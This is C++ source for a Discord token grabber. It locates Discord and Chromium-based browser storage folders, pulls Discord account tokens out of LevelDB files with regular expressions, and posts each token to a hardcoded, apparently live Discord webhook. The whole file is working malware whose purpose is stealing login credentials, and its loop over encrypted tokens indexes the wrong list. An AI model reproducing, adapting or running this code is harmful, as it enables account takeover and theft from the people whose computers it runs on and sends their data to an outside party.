#include <iostream>
#define CURL_STATICLIB
#include <fstream>
#include <sys/stat.h>
#include <filesystem>
#include <regex>
#include <curl/curl.h>

using namespace std;
namespace fs = std::filesystem;

const char* WEBHOOK = "https://discord.com/api/webhooks/1005813624692015106/PQUJ8-8EiuCW_UmZaWk49wLmx2yw9pF_Tlj173Yy2Afkewe6ssHyicxve8ro6uFTEiQh";

bool hasEnding(string const& fullString, string const& ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    }
    else {
        return false;
    }
}

bool pathExist(const string& s)
{
    struct stat buffer;
    return (stat(s.c_str(), &buffer) == 0);
}

void sendWebhook(const char* content) {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, content);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

vector<string> grabPath()
{
    vector<string> targetLocations;

    char* roaming;
    size_t len;
    _dupenv_s(&roaming, &len, "APPDATA");

    char* local;
    size_t len2;
    _dupenv_s(&local, &len2, "LOCALAPPDATA");

    string Discord = string(roaming) + "\\Discord";
    string DiscordCanary = string(roaming) + "\\discordcanary";
    string DiscordPTB = string(roaming) + "\\discordptb";
    string Opera = string(roaming) + "\\Opera Software\\Opera Stable";
    string Chrome = string(local) + "\\Google\\Chrome\\User Data\\Default";
    string Brave = string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
    string Yandex = string(local) + "\\Yandex\\YandexBrowser\\User Data\\Default";

    targetLocations.push_back(Discord);
    targetLocations.push_back(DiscordCanary);
    targetLocations.push_back(DiscordPTB);
    targetLocations.push_back(Opera);
    targetLocations.push_back(Chrome);
    targetLocations.push_back(Brave);
    targetLocations.push_back(Yandex);

    free(local);
    free(roaming);

    return targetLocations;
}

vector<string> findMatch(string str, regex reg)
{
    vector<string> output;
    sregex_iterator currentMatch(str.begin(), str.end(), reg);
    sregex_iterator lastMatch;

    while (currentMatch != lastMatch) {
        smatch match = *currentMatch;
        output.push_back(match.str());
        currentMatch++;
    }

    return output;
}

struct disc_token { std::string tkn; bool crypt; };

void searchToken(const string& loc) {
    ifstream ifs(loc, ios_base::binary);
    string content((istreambuf_iterator<char>(ifs)), (istreambuf_iterator<char>()));

    vector<disc_token> master;

    regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    regex reg2("dQw4w9WgXcQ:[^\\\"]*");

    vector<string> check = findMatch(content, reg1);
    vector<string> check2 = findMatch(content, reg2);

    for (int i = 0; i < check.size(); i++) {
        master.push_back({ check[i] , false});
    }
    for (int i = 0; i < check2.size(); i++) {
        master.push_back({ check[i] , true });
    }

    for (int i = 0; i < master.size(); i++) {
        string combine = "content=";

        disc_token fuck = master[i];
        if (fuck.crypt)
        {
            combine += "```" + fuck.tkn + " | CRYPT!" + "```";
            const char* postContent = combine.c_str();
            sendWebhook(postContent);
        }
        else
        {
            combine += "```" + master[i].tkn + "```";
            const char* postContent = combine.c_str();
            sendWebhook(postContent);
        }

    }
}

void getToken(const string& path)
{
    string target = path + "\\Local Storage\\leveldb";

    for (const auto& entry : fs::directory_iterator(target))
    {
        string strPath = entry.path().string();
        if (hasEnding(strPath, ".log"))
        {
            searchToken(strPath);
        }

        if (hasEnding(strPath, ".ldb"))
        {
            searchToken(strPath);
        }
    }
}

void do_funny_stuff()
{

    vector<string> targetLocation = grabPath();
    for (int i = 0; i < targetLocation.size(); i++) {
        if (pathExist(targetLocation[i])) {
            getToken(targetLocation[i]);
        }
    }

}